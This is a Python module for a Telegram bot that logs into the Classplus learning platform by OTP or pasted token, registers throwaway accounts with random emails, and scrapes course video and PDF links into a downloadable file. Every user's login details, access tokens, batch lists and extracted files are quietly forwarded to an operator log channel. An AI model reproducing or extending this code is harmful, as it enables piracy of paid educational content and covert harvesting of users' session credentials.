import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
import concurrent.futures
import re
from config import PREMIUM_LOGS, join,BOT_TEXT
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log
import base64
from urllib.parse import urlparse, parse_qs

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")


apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper() 

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    # Step 1: Ask for details
    details = await app.ask(message.chat.id, 
        "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
        "Send **ID & Password** in this format:\n"
        "<code>ORG_CODE*Mobile</code>\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()

    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*")
            
            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
    "Accept": "application/json, text/plain, */*",
    "region": "IN",
    "accept-language": "en",
    "Content-Type": "application/json;charset=utf-8",
    "Api-Version": "51",
    "device-id": device_id
            }
            
            # Step 2: Fetch Organization Details
            org_response = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_response["data"]["orgId"]
            org_name = org_response["data"]["orgName"]

            # Step 3: Generate OTP
            otp_payload = {
                'countryExt': '91',
                'orgCode': org_name,
                'viaSms': '1',
                'mobile': mobile,
                'orgId': org_id,
                'otpCount': 0
            }
             
            otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            print(otp_response)

            if otp_response.status_code == 200:
                otp_data = otp_response.json()
                session_id = otp_data['data']['sessionId']
                print(session_id)

                # Step 4: Ask for OTP
                user_otp = await app.ask(message.chat.id, 
                    "📱 <b>OTP Verification</b>\n\n"
                    "OTP has been sent to your mobile number.\n"
                    "Please enter the OTP to continue.", 
                    timeout=300
                )

                if user_otp.text.isdigit():
                    otp = user_otp.text.strip()
                    print(otp)

                    # Step 5: Verify OTP
                    fingerprint_id = str(uuid.uuid4()).replace('-', '')
                    verify_payload = {
                        "otp": otp,
                        "countryExt": "91",
                        "sessionId": session_id,
                        "orgId": org_id,
                        "fingerprintId": fingerprint_id,
                        "mobile": mobile
                    }
                    
                    verify_response = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
                    

                    if verify_response.status_code == 200:
                        verify_data = verify_response.json()

                        if verify_data['status'] == 'success':
                            # OTP Verified - Proceed with Login
                            token = verify_data['data']['token']
                            s.headers['x-access-token'] = token
                            await message.reply_text(
                                "✅ <b>Login Successful!</b>\n\n"
                                "🔑 <b>Your Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            await app.send_message(PREMIUM_LOGS, 
                                "✅ <b>New Login Alert</b>\n\n"
                                "🔑 <b>Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")


                    elif verify_response.status_code == 201:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                    
                    elif verify_response.status_code == 409:

                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            
                            else:
                                await message.reply("Failed to verify OTP. Please try again.")
                        else:
                            await message.reply("NO BATCH FOUND OR ENTERED OTP IS NOT CORRECT .")
                    else:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")
                        else:
                            await message.reply("wrong OTP ")
                else:
                    await message.reply("Failed to generate OTP. Please check your details and try again.")

        except Exception as e:
            await message.reply(f"Error: {str(e)}")

    elif len(user_input) > 20:
        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
        await app.send_message(PREMIUM_LOGS, a)
        headers = {
            'x-access-token': user_input,
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }
        response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
        if response.status_code == 200:
            courses = response.json()["data"]["courses"]
    
            s.session_data = {
                "token": user_input,
                "courses": {course["id"]: course["name"] for course in courses}
            }

            org_name = None

            for course in courses:
                shareable_link = course["shareableLink"]
    
                if "courses.store" in shareable_link:
  
                    new_data = shareable_link.split('.')[0].split('//')[-1]
                    org_response = s.get(f"https://api.classplusapp.com/v2/orgs/{new_data}", headers=headers)
        
                    if org_response.status_code == 200:
                        org_data = org_response.json().get("data", {})
                        org_id = org_data.get("orgId")
                        org_name = org_data.get("orgName")
                else:
                    org_name = shareable_link.split('//')[1].split('.')[1]

                print(f"Org Name: {org_name}")

            await fetch_batches(app, message, org_name)
        else:
            await message.reply("Invalid token. Please try again.")
    else:
        await message.reply("Invalid input. Please send details in the correct format.")



async def fetch_batches(app, message, org_name):
    session_data = s.session_data
    
    if "courses" in session_data:
        courses = session_data["courses"]
        
        
      
        text = "📚 <b>Available Batches</b>\n\n"
        course_list = []
        for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
            text += f"{idx}. <code>{course_name}</code>\n"
            course_list.append((idx, course_id, course_name))
        
        await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
        selected_index = await app.ask(
            message.chat.id, 
            f"{text}\n"
            "Send the index number of the batch to download.", 
            timeout=180
        )
        
        if selected_index.text.isdigit():
            selected_idx = int(selected_index.text.strip())
            
            if 1 <= selected_idx <= len(course_list):
                selected_course_id = course_list[selected_idx - 1][1]
                selected_course_name = course_list[selected_idx - 1][2]
                
                await app.send_message(
                    message.chat.id,
                    "🔄 <b>Processing Course</b>\n"
                    f"└─ Current: <code>{selected_course_name}</code>"
                )
                await extract_batch(app, message, org_name, selected_course_id)
            else:
                await app.send_message(
                    message.chat.id,
                    "❌ <b>Invalid Input!</b>\n\n"
                    "Please send a valid index number from the list."
                )
        else:
            await app.send_message(
                message.chat.id,
                "❌ <b>Invalid Input!</b>\n\n"
                "Please send a valid index number."
            )
              
    else:
        await app.send_message(
            message.chat.id,
            "❌ <b>No Batches Found</b>\n\n"
            "Please check your credentials and try again."
        )


async def extract_batch(app, message, org_name, batch_id):
    session_data = s.session_data
    
    if "token" in session_data:
        batch_name = session_data["courses"][batch_id]
        headers = {
            'x-access-token': session_data["token"],
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }

        def encode_partial_url(url):
            """Encode the latter half of the URL while keeping the first half readable."""
            if not url:
                return ""
            
            # Parse the URL
            parsed = urlparse(url)
            
            # Get the base part (scheme + netloc)
            base_part = f"{parsed.scheme}://{parsed.netloc}"
            
            # Get everything after the domain
            path_part = url[len(base_part):]
            
            # Encode the path part
            encoded_path = base64.b64encode(path_part.encode()).decode()
            
            # Return combined URL
            return f"{base_part}{encoded_path}"

        async def fetch_live_videos(course_id):
            """Fetch live videos from the API with contentHashId."""
            outputs = []
            async with aiohttp.ClientSession() as session:
                try:
                    url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                    async with session.get(url, headers=headers) as response:
                        j = await response.json()
                        if "data" in j and "list" in j["data"]:
                            for video in j["data"]["list"]:
                                name = video.get("name", "Unknown Video")
                                video_url = video.get("url", "")
                                content_hash = video.get("contentHashId", "")
                        
                                if video_url:
                                    # Encode the latter part of the URL
                                    encoded_url = encode_partial_url(video_url)
                                    # Include contentHashId as part of the output
                                    outputs.append(f"{name}:\n{encoded_url}\ncontentHashId: {content_hash}\n")
                except Exception as e:
                    print(f"Error fetching live videos: {e}")

            return outputs


        async def process_course_contents(course_id, folder_id=0, folder_path=""):
            """Recursively fetch and process course content, with partially encoded URLs."""
            result = []
            url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'

            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers) as resp:
                    course_data = await resp.json()
                    course_data = course_data["data"]["courseContent"]

            tasks = []
            for item in course_data:
                content_type = str(item.get("contentType"))
                sub_id = item.get("id")
                sub_name = item.get("name", "Untitled")
                video_url = item.get("url", "")
                content_hash = item.get("contentHashId", "")

                if content_type in ("2", "3"):  # Video or PDF
                    if video_url:
                        # Encode the latter part of the URL
                        encoded_url = encode_partial_url(video_url)
                        if content_hash:
                            encoded_url += f"*UGxCP_hash={content_hash}\n"
                        full_info = f"{folder_path}{sub_name}: {encoded_url}"
                        result.append(full_info)

                elif content_type == "1":  # Folder
                    new_folder_path = f"{folder_path}{sub_name} - "
                    tasks.append(process_course_contents(course_id, sub_id, new_folder_path))

            sub_contents = await asyncio.gather(*tasks)
            for sub_content in sub_contents:
                result.extend(sub_content)

            return result

        
        async def write_to_file(extracted_data):
            """Write data to a text file asynchronously."""
            invalid_chars = '\t:/+#|@*.'
            clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
            clean_name = clean_name.replace('_', ' ')
            file_path = f"{clean_name}.txt"
            
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(''.join(extracted_data))  
            return file_path

        extracted_data, live_videos = await asyncio.gather(
            process_course_contents(batch_id),
            fetch_live_videos(batch_id)
        )

        extracted_data.extend(live_videos)
        file_path = await write_to_file(extracted_data)

        # Count different types of content
        video_count = sum(1 for line in extracted_data if "Video" in line or ".mp4" in line)
        pdf_count = sum(1 for line in extracted_data if ".pdf" in line)
        total_links = len(extracted_data)
        other_count = total_links - (video_count + pdf_count)
        
        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> {org_name}\n"
            f"📚 <b>BATCH:</b> {batch_name}\n"
            f"📅 <b>DATE:</b> {time_new} IST\n\n"
            f"📊 <b>CONTENT STATS</b>\n"
            f"├─ 📁 Total Links: {total_links}\n"
            f"├─ 🎬 Videos: {video_count}\n"
            f"├─ 📄 PDFs: {pdf_count}\n"
            f"└─ 📦 Others: {other_count}\n\n"
            f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await app.send_document(message.chat.id, file_path, caption=caption)
        await app.send_document(PREMIUM_LOGS, file_path, caption=caption)

        os.remove(file_path)
            

    
